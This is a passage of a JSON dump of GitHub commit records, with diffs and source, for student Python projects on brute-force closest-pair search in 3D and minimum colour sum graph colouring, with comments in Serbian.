(p1[i]-p2[i])**2","    return math.sqrt(result)"]}],"source":"\nimport numpy as np import matplotlib.pyplot as plt import random import math def generate_points(n): points=[] for i in range(n): x=random.randint(0,100) y=random.randint(0,100) z=random.randint(0,100) points.append([x,y,z]) return points n=int(input(\"Enter number of points: \")) points=generate_points(n) print(points) def distance(p1,p2): return math.sqrt((p1[0]-p2[0])**2 +(p1[1]-p2[1])**2 +(p1[2]-p2[2])**2) def visualize_closest_pair(points): min_distance=distance(points[0],points[1]) p1=points[0] p2=points[1] for i in range(len(points)): for j in range(i+1,len(points)): if distance(points[i],points[j]) < min_distance: min_distance=distance(points[i],points[j]) p1=points[i] p2=points[j] x=[] y=[] z=[] for i in range(len(points)): x.append(points[i][0]) y.append(points[i][1]) z.append(points[i][2]) fig=plt.figure() ax=fig.add_subplot(111, projection='3d') ax.scatter(x,y,z) ax.scatter(p1[0],p1[1],p1[2],color='red') ax.scatter(p2[0],p2[1],p2[2],color='red') ax.plot([p1[0],p2[0]],[p1[1],p2[1]],[p1[2],p2[2]],color='red') plt.show() def print_distances(points): distances=[] for i in range(len(points)): for j in range(i+1,len(points)): distances.append(distance(points[i],points[j])) distances.sort() print(distances) print_distances(points) visualize_closest_pair(points) ","sourceWithComments":"import numpy as np \nimport matplotlib.pyplot as plt\nimport random\nimport math\n\n#Find closest pair of points in a set of x,y,z coordinates\n#Generate random points based on n input and insert to list\ndef generate_points(n):\n    points = []\n    for i in range(n):\n        x = random.randint(0,100)\n        y = random.randint(0,100)\n        z = random.randint(0,100)\n        points.append([x,y,z])\n    return points\n\nn = int(input(\"Enter number of points: \"))\npoints = generate_points(n)\nprint(points)\n\n# #visualize points with matplotlib\n# def visualize(points):\n#     x = []\n#     y = []\n#     z = []\n#     for i in range(len(points)):\n#         x.append(points[i][0])\n#         y.append(points[i][1])\n#         z.append(points[i][2])\n#     fig = plt.figure()\n#     ax = fig.add_subplot(111, projection='3d')\n#     ax.scatter(x,y,z)\n#     plt.show()\n\n# visualize(points)\n\n#Find distance between two points\ndef distance(p1,p2):\n    return math.sqrt((p1[0]-p2[0])**2 + (p1[1]-p2[1])**2 + (p1[2]-p2[2])**2)\n\n#Find closest pair of points\n\n#color the closest pair of points and draw the line between them\ndef visualize_closest_pair(points):\n    min_distance = distance(points[0],points[1])\n    p1 = points[0]\n    p2 = points[1]\n    for i in range(len(points)):\n        for j in range(i+1,len(points)):\n            if distance(points[i],points[j]) < min_distance:\n                min_distance = distance(points[i],points[j])\n                p1 = points[i]\n                p2 = points[j]\n    x = []\n    y = []\n    z = []\n    for i in range(len(points)):\n        x.append(points[i][0])\n        y.append(points[i][1])\n        z.append(points[i][2])\n    fig = plt.figure()\n    ax = fig.add_subplot(111, projection='3d')\n    ax.scatter(x,y,z)\n    ax.scatter(p1[0],p1[1],p1[2],color='red')\n    ax.scatter(p2[0],p2[1],p2[2],color='red')\n    ax.plot([p1[0],p2[0]],[p1[1],p2[1]],[p1[2],p2[2]],color='red')\n    plt.show()\n\n#print all distances between points sorted in ascending order\ndef print_distances(points):\n    distances = []\n    for i in range(len(points)):\n        for j in range(i+1,len(points)):\n            distances.append(distance(points[i],points[j]))\n    distances.sort()\n    print(distances)\n\nprint_distances(points)\nvisualize_closest_pair(points)"}},"msg":"update brute force"}},"https:\/\/github.com\/Marija63\/Racunarska-Inteligencija":{"8d78eb3b5f2643c0740ad14bc72b3d6c16ea44ae":{"url":"https:\/\/api.github.com\/repos\/Marija63\/Racunarska-Inteligencija\/commits\/8d78eb3b5f2643c0740ad14bc72b3d6c16ea44ae","html_url":"https:\/\/github.com\/Marija63\/Racunarska-Inteligencija\/commit\/8d78eb3b5f2643c0740ad14bc72b3d6c16ea44ae","message":"Update Brute-Force MCS (1).py\n\nupdate","sha":"8d78eb3b5f2643c0740ad14bc72b3d6c16ea44ae","keyword":"brute force update","diff":"diff --git a\/Brute-Force MCS (1).py b\/Brute-Force MCS (1).py\nindex 1600ae7..c407d4e 100644\n--- a\/Brute-Force MCS (1).py\t\n+++ b\/Brute-Force MCS (1).py\t\n@@ -1,7 +1,7 @@\n #!\/usr\/bin\/env python\n # coding: utf-8\n \n-# In[13]:\n+# In[98]:\n \n \n import random\n@@ -38,17 +38,17 @@ def graphColourUtil(self, m, colour, v):\n     def graphColouring(self, m):\n         colour = [0] * self.V\n         if self.graphColourUtil(m, colour, 0) == None:\n-            return False\n+            return False, 0,colour\n   \n         # Print the solution\n-        print(\"Solution exist and Following are the assigned colours:\")\n-        for c in colour:\n-            print(c, end=' ')\n+        #print(\"Solution exist and Following are the assigned colours:\")\n+        #for c in colour:\n+        #    print(c, end=' ')\n             \n         \n-        print(\"number of color is\")\n-        print(max(colour))\n-        return True\n+        #print(\"number of color is\")\n+        #print(max(colour))\n+        return True , max(colour),colour\n     \n     \n     \n@@ -70,43 +70,31 @@ def randomGraph(self, numvertices):\n # Driver Code\n if __name__ == '__main__':\n \n-    numvertices= random.randrange(3,100)\n+    numvertices= random.randrange(3,50)\n     g = Graph(numvertices)\n     #g= Graph(5)\n     print(\"number of enges\")\n     print(numvertices)\n     g.graph = g.randomGraph(numvertices)\n-    \n-    if g.graphColouring(numvertices) == False:\n+    true, num, colour =g.graphColouring(numvertices)\n+    if true == False:\n         print(\"solution not exist\")\n     \n+    elif true == True:\n+        for i in range(n-1):\n+            stop, newnum, colour1 =g.graphColouring(n-i-1)\n+            if stop == True:\n+                colour=colour1\n+                continue\n+            elif stop == False:\n+                print(\"Solution exist and Following are the assigned colours:\")\n+                for c in colour:\n+                    print(c,end=' ')\n+                print()\n+                print('min num of colour are ',max(colour))\n+                break\n+                \n     \n-   \n-    \n-  \n-  \n-\n-\n-# In[ ]:\n-\n-\n-\n-\n-\n-# In[37]:\n-\n-\n-\n-\n-\n-# In[48]:\n-\n-\n-\n-\n-\n-# In[ ]:\n-\n \n \n \n","files":{"\/Brute-Force MCS (1).py":{"changes":[{"diff":"\n     def graphColouring(self, m):\n         colour = [0] * self.V\n         if self.graphColourUtil(m, colour, 0) == None:\n-            return False\n+            return False, 0,colour\n   \n         # Print the solution\n-        print(\"Solution exist and Following are the assigned colours:\")\n-        for c in colour:\n-            print(c, end=' ')\n+        #print(\"Solution exist and Following are the assigned colours:\")\n+        #for c in colour:\n+        #    print(c, end=' ')\n             \n         \n-        print(\"number of color is\")\n-        print(max(colour))\n-        return True\n+        #print(\"number of color is\")\n+        #print(max(colour))\n+        return True , max(colour),colour\n     \n     \n     \n","add":7,"remove":7,"filename":"\/Brute-Force MCS (1).py","badparts":["            return False","        print(\"Solution exist and Following are the assigned colours:\")","        for c in colour:","            print(c, end=' ')","        print(\"number of color is\")","        print(max(colour))","        return True"],"goodparts":["            return False, 0,colour","        return True , max(colour),colour"]},{"diff":"\n # Driver Code\n if __name__ == '__main__':\n \n-    numvertices= random.randrange(3,100)\n+    numvertices= random.randrange(3,50)\n     g = Graph(numvertices)\n     #g= Graph(5)\n     print(\"number of enges\")\n     print(numvertices)\n     g.graph = g.randomGraph(numvertices)\n-    \n-    if g.graphColouring(numvertices) == False:\n+    true, num, colour =g.graphColouring(numvertices)\n+    if true == False:\n         print(\"solution not exist\")\n     \n+    elif true == True:\n+        for i in range(n-1):\n+            stop, newnum, colour1 =g.graphColouring(n-i-1)\n+            if stop == True:\n+                colour=colour1\n+                continue\n+            elif stop == False:\n+                print(\"Solution exist and Following are the assigned colours:\")\n+                for c in colour:\n+                    print(c,end=' ')\n+                print()\n+                print('min num of colour are ',max(colour))\n+                break\n+                \n     \n-   \n-    \n-  \n-  \n-\n-\n-# In[ ]:\n-\n-\n-\n-\n-\n-# In[37]:\n-\n-\n-\n-\n-\n-# In[48]:\n-\n-\n-\n-\n-\n-# In[ ]:\n-\n \n \n \n","add":17,"remove":29,"filename":"\/Brute-Force MCS (1).py","badparts":["    numvertices= random.randrange(3,100)","    if g.graphColouring(numvertices) == False:"],"goodparts":["    numvertices= random.randrange(3,50)","    true, num, colour =g.graphColouring(numvertices)","    if true == False:","    elif true == True:","        for i in range(n-1):","            stop, newnum, colour1 =g.graphColouring(n-i-1)","            if stop == True:","                colour=colour1","                continue","            elif stop == False:","                print(\"Solution exist and Following are the assigned colours:\")","                for c in colour:","                    print(c,end=' ')","                print()","                print('min num of colour are ',max(colour))","                break"]}],"source":"\n import random import numpy as np class Graph(): def __init__(self, vertices): self.V=vertices self.graph=[[0 for column in range(vertices)] for row in range(vertices)] def isSafe(self, v, colour, c): for i in range(self.V): if self.graph[v][i]==1 and colour[i]==c: return False return True def graphColourUtil(self, m, colour, v): if v==self.V: return True for c in range(1, m +1): if self.isSafe(v, colour, c)==True: colour[v]=c if self.graphColourUtil(m, colour, v +1)==True: return True colour[v]=0 def graphColouring(self, m): colour=[0] * self.V if self.graphColourUtil(m, colour, 0)==None: return False print(\"Solution exist and Following are the assigned colours:\") for c in colour: print(c, end=' ') print(\"number of color is\") print(max(colour)) return True def randomGraph(self, numvertices): n=numvertices adjacency_matrix=np.random.randint(0,2,(n,n)) for i in range(n): for j in range(n): if adjacency_matrix[i][j]==1: adjacency_matrix[j][i]=1 adjacency_matrix[i][i]=0 print(adjacency_matrix) return adjacency_matrix if __name__=='__main__': numvertices=random.randrange(3,100) g=Graph(numvertices) print(\"number of enges\") print(numvertices) g.graph=g.randomGraph(numvertices) if g.graphColouring(numvertices)==False: print(\"solution not exist\") ","sourceWithComments":"#!\/usr\/bin\/env python\n# coding: utf-8\n\n# In[13]:\n\n\nimport random\nimport numpy as np\nclass Graph():\n  \n    def __init__(self, vertices):\n        self.V = vertices\n        self.graph = [[0 for column in range(vertices)]\n                      for row in range(vertices)]\n  \n    # A utility function to check\n    # if the current color assignment\n    # is safe for vertex v\n    def isSafe(self, v, colour, c):\n        for i in range(self.V):\n            if self.graph[v][i] == 1 and colour[i] == c:\n                return False\n        return True\n  \n    # A recursive utility function to solve m\n    # coloring  problem\n    def graphColourUtil(self, m, colour, v):\n        if v == self.V:\n            return True\n  \n        for c in range(1, m + 1):\n            if self.isSafe(v, colour, c) == True:\n                colour[v] = c\n                if self.graphColourUtil(m, colour, v + 1) == True:\n                    return True\n                colour[v] = 0\n  \n    def graphColouring(self, m):\n        colour = [0] * self.V\n        if self.graphColourUtil(m, colour, 0) == None:\n            return False\n  \n        # Print the solution\n        print(\"Solution exist and Following are the assigned colours:\")\n        for c in colour:\n            print(c, end=' ')\n            \n        \n        print(\"number of color is\")\n        print(max(colour))\n        return True\n    \n    \n    \n    def randomGraph(self, numvertices):\n        n=numvertices\n        adjacency_matrix = np.random.randint(0,2,(n,n))\n        for i in range(n):\n            for j in range(n):\n                if adjacency_matrix[i][j] == 1:\n                    adjacency_matrix[j][i] =1\n            adjacency_matrix[i][i]=0\n            \n        print(adjacency_matrix)\n        return  adjacency_matrix\n        \n        \n  \n  \n# Driver Code\nif __name__ == '__main__':\n\n    numvertices= random.randrange(3,100)\n    g = Graph(numvertices)\n    #g= Graph(5)\n    print(\"number of enges\")\n    print(numvertices)\n    g.graph = g.randomGraph(numvertices)\n    \n    if g.graphColouring(numvertices) == False:\n        print(\"solution not exist\")\n    \n    \n   \n    \n  \n  \n\n\n# In[ ]:\n\n\n\n\n\n# In[37]:\n\n\n\n\n\n# In[48]:\n\n\n\n\n\n# In[ ]:\n\n\n\n\n"}},"msg":"Update Brute-Force MCS (1).py\n\nupdate"},"767acd7dcfe220580ae188cba5c509b8c824a47c":{"url":"https:\/\/api.github.com\/repos\/Marija63\/Racunarska-Inteligencija\/commits\/767acd7dcfe220580ae188cba5c509b8c824a47c","html_url":"https:\/\/github.com\/Marija63\/Racunarska-Inteligencija\/commit\/767acd7dcfe220580ae188cba5c509b8c824a47c","sha":"767acd7dcfe220580ae188cba5c509b8c824a47c","keyword":"brute force update","diff":"diff --git a\/Brute-Force MCS (1).py b\/Brute-Force MCS (1).py\nindex c407d4e..dbd0e71 100644\n--- a\/Brute-Force MCS (1).py\t\n+++ b\/Brute-Force MCS (1).py\t\n@@ -1,9 +1,3 @@\n-#!\/usr\/bin\/env python\n-# coding: utf-8\n-\n-# In[98]:\n-\n-\n import random\n import numpy as np\n class Graph():\n@@ -13,44 +7,37 @@ def __init__(self, vertices):\n         self.graph = [[0 for column in range(vertices)]\n                       for row in range(vertices)]\n   \n-    # A utility function to check\n-    # if the current color assignment\n-    # is safe for vertex v\n+    #proveravamo da li mozemo na taj nacin da obojimo graf\n     def isSafe(self, v, colour, c):\n         for i in range(self.V):\n             if self.graph[v][i] == 1 and colour[i] == c:\n                 return False\n         return True\n   \n-    # A recursive utility function to solve m\n-    # coloring  problem\n+    #proveravamo da li mozemo sa m boja da obojimo graf\n+    \n     def graphColourUtil(self, m, colour, v):\n         if v == self.V:\n             return True\n-  \n+        #krecemo od broja 1 i nastavljamo sa prvom slobodnom bojom sa kojom moze da se oboji\n         for c in range(1, m + 1):\n             if self.isSafe(v, colour, c) == True:\n                 colour[v] = c\n+                #kada obojimo taj cvor pozivamo rekurzivno za naredni\n                 if self.graphColourUtil(m, colour, v + 1) == True:\n                     return True\n                 colour[v] = 0\n   \n+    #bojimo graf\n     def graphColouring(self, m):\n         colour = [0] * self.V\n         if self.graphColourUtil(m, colour, 0) == None:\n             return False, 0,colour\n   \n-        # Print the solution\n-        #print(\"Solution exist and Following are the assigned colours:\")\n-        #for c in colour:\n-        #    print(c, end=' ')\n-            \n-        \n-        #print(\"number of color is\")\n-        #print(max(colour))\n+       \n         return True , max(colour),colour\n     \n-    \n+    #numerisemo random graf\n     \n     def randomGraph(self, numvertices):\n         n=numvertices\n@@ -70,20 +57,38 @@ def randomGraph(self, numvertices):\n # Driver Code\n if __name__ == '__main__':\n \n-    numvertices= random.randrange(3,50)\n+    numvertices= random.randrange(3,15)\n     g = Graph(numvertices)\n     #g= Graph(5)\n+    minsuma = 9999999999999\n+    \n+    suma =0\n     print(\"number of enges\")\n     print(numvertices)\n     g.graph = g.randomGraph(numvertices)\n     true, num, colour =g.graphColouring(numvertices)\n+    for c in colour:\n+        suma= suma +c\n+    \n+    if suma <minsuma:\n+        minsuma = suma\n+        \n+        \n+    print('prva suma koju nadje  je: ',minsuma)\n     if true == False:\n         print(\"solution not exist\")\n     \n     elif true == True:\n-        for i in range(n-1):\n-            stop, newnum, colour1 =g.graphColouring(n-i-1)\n+        for i in range(num-1):\n+            suma =0\n+            stop, newnum, colour1 =g.graphColouring(num-i-1)\n+            \n             if stop == True:\n+                for c in colour1:\n+                    suma= suma +c\n+                \n+                if suma <minsuma:\n+                    minsuma = suma\n                 colour=colour1\n                 continue\n             elif stop == False:\n@@ -91,9 +96,11 @@ def randomGraph(self, numvertices):\n                 for c in colour:\n                     print(c,end=' ')\n                 print()\n+                print('minimumna suma je: ' , minsuma)\n                 print('min num of colour are ',max(colour))\n                 break\n-                \n+   \n+  \n     \n \n \n","message":"","files":{"\/Brute-Force MCS (1).py":{"changes":[{"diff":"\n # Driver Code\n if __name__ == '__main__':\n \n-    numvertices= random.randrange(3,50)\n+    numvertices= random.randrange(3,15)\n     g = Graph(numvertices)\n     #g= Graph(5)\n+    minsuma = 9999999999999\n+    \n+    suma =0\n     print(\"number of enges\")\n     print(numvertices)\n     g.graph = g.randomGraph(numvertices)\n     true, num, colour =g.graphColouring(numvertices)\n+    for c in colour:\n+        suma= suma +c\n+    \n+    if suma <minsuma:\n+        minsuma = suma\n+        \n+        \n+    print('prva suma koju nadje  je: ',minsuma)\n     if true == False:\n         print(\"solution not exist\")\n     \n     elif true == True:\n-        for i in range(n-1):\n-            stop, newnum, colour1 =g.graphColouring(n-i-1)\n+        for i in range(num-1):\n+            suma =0\n+            stop, newnum, colour1 =g.graphColouring(num-i-1)\n+            \n             if stop == True:\n+                for c in colour1:\n+                    suma= suma +c\n+                \n+                if suma <minsuma:\n+                    minsuma = suma\n                 colour=colour1\n                 continue\n             elif stop == False:\n","add":21,"remove":3,"filename":"\/Brute-Force MCS (1).py","badparts":["    numvertices= random.randrange(3,50)","        for i in range(n-1):","            stop, newnum, colour1 =g.graphColouring(n-i-1)"],"goodparts":["    numvertices= random.randrange(3,15)","    minsuma = 9999999999999","    suma =0","    for c in colour:","        suma= suma +c","    if suma <minsuma:","        minsuma = suma","    print('prva suma koju nadje  je: ',minsuma)","        for i in range(num-1):","            suma =0","            stop, newnum, colour1 =g.graphColouring(num-i-1)","                for c in colour1:","                    suma= suma +c","                if suma <minsuma:","                    minsuma = suma"]}],"source":"\n import random import numpy as np class Graph(): def __init__(self, vertices): self.V=vertices self.graph=[[0 for column in range(vertices)] for row in range(vertices)] def isSafe(self, v, colour, c): for i in range(self.V): if self.graph[v][i]==1 and colour[i]==c: return False return True def graphColourUtil(self, m, colour, v): if v==self.V: return True for c in range(1, m +1): if self.isSafe(v, colour, c)==True: colour[v]=c if self.graphColourUtil(m, colour, v +1)==True: return True colour[v]=0 def graphColouring(self, m): colour=[0] * self.V if self.graphColourUtil(m, colour, 0)==None: return False, 0,colour return True, max(colour),colour def randomGraph(self, numvertices): n=numvertices adjacency_matrix=np.random.randint(0,2,(n,n)) for i in range(n): for j in range(n): if adjacency_matrix[i][j]==1: adjacency_matrix[j][i]=1 adjacency_matrix[i][i]=0 print(adjacency_matrix) return adjacency_matrix if __name__=='__main__': numvertices=random.randrange(3,50) g=Graph(numvertices) print(\"number of enges\") print(numvertices) g.graph=g.randomGraph(numvertices) true, num, colour=g.graphColouring(numvertices) if true==False: print(\"solution not exist\") elif true==True: for i in range(n-1): stop, newnum, colour1=g.graphColouring(n-i-1) if stop==True: colour=colour1 continue elif stop==False: print(\"Solution exist and Following are the assigned colours:\") for c in colour: print(c,end=' ') print() print('min num of colour are ',max(colour)) break ","sourceWithComments":"#!\/usr\/bin\/env python\n# coding: utf-8\n\n# In[98]:\n\n\nimport random\nimport numpy as np\nclass Graph():\n  \n    def __init__(self, vertices):\n        self.V = vertices\n        self.graph = [[0 for column in range(vertices)]\n                      for row in range(vertices)]\n  \n    # A utility function to check\n    # if the current color assignment\n    # is safe for vertex v\n    def isSafe(self, v, colour, c):\n        for i in range(self.V):\n            if self.graph[v][i] == 1 and colour[i] == c:\n                return False\n        return True\n  \n    # A recursive utility function to solve m\n    # coloring  problem\n    def graphColourUtil(self, m, colour, v):\n        if v == self.V:\n            return True\n  \n        for c in range(1, m + 1):\n            if self.isSafe(v, colour, c) == True:\n                colour[v] = c\n                if self.graphColourUtil(m, colour, v + 1) == True:\n                    return True\n                colour[v] = 0\n  \n    def graphColouring(self, m):\n        colour = [0] * self.V\n        if self.graphColourUtil(m, colour, 0) == None:\n            return False, 0,colour\n  \n        # Print the solution\n        #print(\"Solution exist and Following are the assigned colours:\")\n        #for c in colour:\n        #    print(c, end=' ')\n            \n        \n        #print(\"number of color is\")\n        #print(max(colour))\n        return True , max(colour),colour\n    \n    \n    \n    def randomGraph(self, numvertices):\n        n=numvertices\n        adjacency_matrix = np.random.randint(0,2,(n,n))\n        for i in range(n):\n            for j in range(n):\n                if adjacency_matrix[i][j] == 1:\n                    adjacency_matrix[j][i] =1\n            adjacency_matrix[i][i]=0\n            \n        print(adjacency_matrix)\n        return  adjacency_matrix\n        \n        \n  \n  \n# Driver Code\nif __name__ == '__main__':\n\n    numvertices= random.randrange(3,50)\n    g = Graph(numvertices)\n    #g= Graph(5)\n    print(\"number of enges\")\n    print(numvertices)\n    g.graph = g.randomGraph(numvertices)\n    true, num, colour =g.graphColouring(numvertices)\n    if true == False:\n        print(\"solution not exist\")\n    \n    elif true == True:\n        for i in range(n-1):\n            stop, newnum, colour1 =g.graphColouring(n-i-1)\n            if stop == True:\n                colour=colour1\n                continue\n            elif stop == False:\n                print(\"Solution exist and Following are the assigned colours:\")\n                for c in colour:\n                    print(c,end=' ')\n                print()\n                print('min num of colour are ',max(colour))\n                break\n                \n    \n\n\n\n"}},"msg":"Update Brute-Force MCS (1).py"},"a8502d574c4f2e21138be3a586659558a13af3ef":{"url":"https:\/\/api.github.com\/repos\/Marija63\/Racunarska-Inteligencija\/commits\/a8502d574c4f2e21138be3a586659558a13af3ef","html_url":"https:\/\/github.com\/Marija63\/Racunarska-Inteligencija\/commit\/a8502d574c4f2e21138be3a586659558a13af3ef","sha":"a8502d574c4f2e21138be3a586659558a13af3ef","keyword":"brute force change","diff":"diff --git a\/Brute-Force MCS (1).py b\/Brute-Force MCS (1).py\ndeleted file mode 100644\nindex dbd0e71..0000000\n--- a\/Brute-Force MCS (1).py\t\n+++ \/dev\/null\n@@ -1,107 +0,0 @@\n-import random\n-import numpy as np\n-class Graph():\n-  \n-    def __init__(self, vertices):\n-        self.V = vertices\n-        self.graph = [[0 for column in range(vertices)]\n-                      for row in range(vertices)]\n-  \n-    #proveravamo da li mozemo na taj nacin da obojimo graf\n-    def isSafe(self, v, colour, c):\n-        for i in range(self.V):\n-            if self.graph[v][i] == 1 and colour[i] == c:\n-                return False\n-        return True\n-  \n-    #proveravamo da li mozemo sa m boja da obojimo graf\n-    \n-    def graphColourUtil(self, m, colour, v):\n-        if v == self.V:\n-            return True\n-        #krecemo od broja 1 i nastavljamo sa prvom slobodnom bojom sa kojom moze da se oboji\n-        for c in range(1, m + 1):\n-            if self.isSafe(v, colour, c) == True:\n-                colour[v] = c\n-                #kada obojimo taj cvor pozivamo rekurzivno za naredni\n-                if self.graphColourUtil(m, colour, v + 1) == True:\n-                    return True\n-                colour[v] = 0\n-  \n-    #bojimo graf\n-    def graphColouring(self, m):\n-        colour = [0] * self.V\n-        if self.graphColourUtil(m, colour, 0) == None:\n-            return False, 0,colour\n-  \n-       \n-        return True , max(colour),colour\n-    \n-    #numerisemo random graf\n-    \n-    def randomGraph(self, numvertices):\n-        n=numvertices\n-        adjacency_matrix = np.random.randint(0,2,(n,n))\n-        for i in range(n):\n-            for j in range(n):\n-                if adjacency_matrix[i][j] == 1:\n-                    adjacency_matrix[j][i] =1\n-            adjacency_matrix[i][i]=0\n-            \n-        print(adjacency_matrix)\n-        return  adjacency_matrix\n-        \n-        \n-  \n-  \n-# Driver Code\n-if __name__ == '__main__':\n-\n-    numvertices= random.randrange(3,15)\n-    g = Graph(numvertices)\n-    #g= Graph(5)\n-    minsuma = 9999999999999\n-    \n-    suma =0\n-    print(\"number of enges\")\n-    print(numvertices)\n-    g.graph = g.randomGraph(numvertices)\n-    true, num, colour =g.graphColouring(numvertices)\n-    for c in colour:\n-        suma= suma +c\n-    \n-    if suma <minsuma:\n-        minsuma = suma\n-        \n-        \n-    print('prva suma koju nadje  je: ',minsuma)\n-    if true == False:\n-        print(\"solution not exist\")\n-    \n-    elif true == True:\n-        for i in range(num-1):\n-            suma =0\n-            stop, newnum, colour1 =g.graphColouring(num-i-1)\n-            \n-            if stop == True:\n-                for c in colour1:\n-                    suma= suma +c\n-                \n-                if suma <minsuma:\n-                    minsuma = suma\n-                colour=colour1\n-                continue\n-            elif stop == False:\n-                print(\"Solution exist and Following are the assigned colours:\")\n-                for c in colour:\n-                    print(c,end=' ')\n-                print()\n-                print('minimumna suma je: ' , minsuma)\n-                print('min num of colour are ',max(colour))\n-                break\n-   \n-  \n-    \n-\n-\n-\ndiff --git a\/__pycache__\/brute_force_msc.cpython-310.pyc b\/__pycache__\/brute_force_msc.cpython-310.pyc\nnew file mode 100644\nindex 0000000..6dcea1d\nBinary files \/dev\/null and b\/__pycache__\/brute_force_msc.cpython-310.pyc differ\ndiff --git a\/__pycache__\/graph.cpython-310.pyc b\/__pycache__\/graph.cpython-310.pyc\nnew file mode 100644\nindex 0000000..8ee302c\nBinary files \/dev\/null and b\/__pycache__\/graph.cpython-310.pyc differ\ndiff --git a\/__pycache__\/local_search_mcs.cpython-310.pyc b\/__pycache__\/local_search_mcs.cpython-310.pyc\nindex 2b7595d..74aef42 100644\nBinary files a\/__pycache__\/local_search_mcs.cpython-310.pyc and b\/__pycache__\/local_search_mcs.cpython-310.pyc differ\ndiff --git a\/__pycache__\/simulated_annealing_msc.cpython-310.pyc b\/__pycache__\/simulated_annealing_msc.cpython-310.pyc\nindex 3da0964..52b1b28 100644\nBinary files a\/__pycache__\/simulated_annealing_msc.cpython-310.pyc and b\/__pycache__\/simulated_annealing_msc.cpython-310.pyc differ\ndiff --git a\/brute_force_msc.py b\/brute_force_msc.py\nnew file mode 100644\nindex 0000000..e590c21\n--- \/dev\/null\n+++ b\/brute_force_msc.py\n@@ -0,0 +1,121 @@\n+from graph import Graph\n+from collections import Counter\n+\n+# proveravamo da li mozemo na taj nacin da obojimo graf\n+def isSafe(graph, v, colors_vector, c):\n+    for i in range(graph.num_of_vertices):\n+        if graph.adjacency_matrix[v][i] == 1 and colors_vector[i] == c:\n+            return False\n+    return True\n+\n+# proveravamo da li mozemo sa m boja da obojimo graf\n+def graph_coloring_util(graph, m, colors_vector, v):\n+    if v == graph.num_of_vertices:\n+        return True\n+    # krecemo od broja 1 i nastavljamo sa prvom slobodnom bojom sa kojom moze da se oboji\n+    for c in range(1, m + 1):\n+        if isSafe(graph, v, colors_vector, c) == True:\n+            colors_vector[v] = c\n+            # kada obojimo taj cvor pozivamo rekurzivno za naredni\n+            if graph_coloring_util(graph, m, colors_vector, v + 1) == True:\n+                return True\n+            colors_vector[v] = 0\n+\n+# pokusavamo da obojimo graf sa m boja\n+def graph_coloring(graph,m):\n+    colors_vector = [0 for _ in range(graph.num_of_vertices)]\n+    if graph_coloring_util(graph, m, colors_vector, 0) == None:\n+        return False, 0, colors_vector\n+    return True, max(colors_vector), colors_vector\n+\n+#stari calc_solution trebace\n+def minimum_color_sum(colors_vector):\n+\n+    #[1,2,4,7,1,3,6,7,7,2,4] boje svakog cvora\n+    #[(1,2),(2,2),(3,1),(4,2),(6,1),(7,3)] broj pojavljivanja svake boje\n+    #[(7,3),(4,2),(2,2),(1,2),(6,1),(3,1)] sortiramo po boju pojavljivanja tj.drugom parametru\n+    # 3*1 + 2*2 + 2*3 + 2*4 + 1*5 + 1*6  funkcija cilja=suma(broj_pojavljuvanja*indeks_unizu)\n+\n+    tmp = list(map(lambda el: (el,1),colors_vector))\n+    tmp = list(set([(el[0], Counter(tmp)[el]) for el in tmp]))\n+    tmp = sorted(tmp, key = lambda el: el[1],reverse=True)\n+\n+    total_sum = 0\n+    for index,tupp in enumerate(tmp):\n+        total_sum += (index+1)*tupp[1]\n+\n+    return total_sum\n+\n+\n+def brute_force(graph):\n+    num_of_color = 0\n+    #pokusavamo da obojimo graf sa minimalnim brojem boja\n+    for i in range(2,graph.num_of_vertices + 1):\n+        success, num_of_color, colors_vector = graph_coloring(graph,i)\n+        # ako je graf uspesno obojen\n+        if success == True:\n+            print(\"Graf je obojen sa minimalno \" + str(num_of_color) + \" boja\")\n+            print(colors_vector)\n+            sum = minimum_color_sum(colors_vector)\n+            print(\"Minimalna suma: \", sum)\n+            break\n+\n+if __name__ == '__main__':\n+    g = Graph(16)\n+    g.random_graph()\n+    g.save_graph_to_file(\"small_random_graph.txt\")\n+    # g.load_graph_from_file(\"small_random_graph.txt\")\n+    print(g)\n+\n+    # brute_force(g)\n+\n+\n+\n+    # staro --vrtno nece TREBATI\n+    # numvertices= random.randrange(3,15)\n+    # g = Graph(numvertices)\n+    # #g= Graph(5)\n+    # minsuma = 9999999999999\n+    #\n+    # suma =0\n+    # print(\"number of enges\")\n+    # print(numvertices)\n+    # g.graph = g.randomGraph(numvertices)\n+    # true, num, colors_vector =g.graphcolors_vectoring(numvertices)\n+    # for c in colors_vector:\n+    #     suma= suma +c\n+    #\n+    # if suma <minsuma:\n+    #     minsuma = suma\n+    #\n+    #\n+    # print('prva suma koju nadje  je: ',minsuma)\n+    # if true == False:\n+    #     print(\"solution not exist\")\n+    #\n+    # elif true == True:\n+    #     for i in range(num-1):\n+    #         suma =0\n+    #         stop, newnum, colors_vector1 =g.graphcolors_vectoring(num-i-1)\n+    #\n+    #         if stop == True:\n+    #             for c in colors_vector1:\n+    #                 suma= suma +c\n+    #\n+    #             if suma <minsuma:\n+    #                 minsuma = suma\n+    #             colors_vector=colors_vector1\n+    #             continue\n+    #         elif stop == False:\n+    #             print(\"Solution exist and Following are the assigned colors_vectors:\")\n+    #             for c in colors_vector:\n+    #                 print(c,end=' ')\n+    #             print()\n+    #             print('minimumna suma je: ' , minsuma)\n+    #             print('min num of colors_vector are ',max(colors_vector))\n+    #             break\n+   \n+\n+\n+\n+\ndiff --git a\/graph.py b\/graph.py\nindex 801ccf2..06ee263 100644\n--- a\/graph.py\n+++ b\/graph.py\n@@ -3,7 +3,8 @@ class Graph():\n \n     def __init__(self,num_of_vertices=10):\n         self.num_of_vertices = num_of_vertices\n-        self.adjacency_matrix = np.array([[0 for _ in range(num_of_vertices)] for _ in range(num_of_vertices)])\n+        self.adjacency_matrix = np.array([[0 for column in range(num_of_vertices)]\n+                                          for rows in range(num_of_vertices)])\n \n     #neusmeren graf\n     def add_edge(self, u, v):\n@@ -25,6 +26,7 @@ def random_graph(self):\n \n     def get_edges(self,i,j):\n         return self.adjacency_matrix[i][j]\n+\n     def __str__(self):\n        return 'Num of vertices: \\n' + str(self.num_of_vertices) + '\\n' + \"Adjacency_matrix: \\n\" + str(self.adjacency_matrix)\n \n@@ -34,7 +36,6 @@ def load_graph_from_file(self,filename):\n             self.num_of_vertices = int(f.readline())\n             self.adjacency_matrix = np.loadtxt(f)\n \n-\n     def save_graph_to_file(self,filename):\n         with open(filename, \"w\") as f:\n             f.write(str(self.num_of_vertices))\ndiff --git a\/local_search_mcs.py b\/local_search_mcs.py\nindex 375421f..25db5f6 100644\n--- a\/local_search_mcs.py\n+++ b\/local_search_mcs.py\n@@ -4,27 +4,8 @@\n \n from copy import deepcopy\n from matplotlib import pyplot as plt\n-from collections import Counter\n from graph import Graph\n \n-#stari calc_solution trebace\n-def 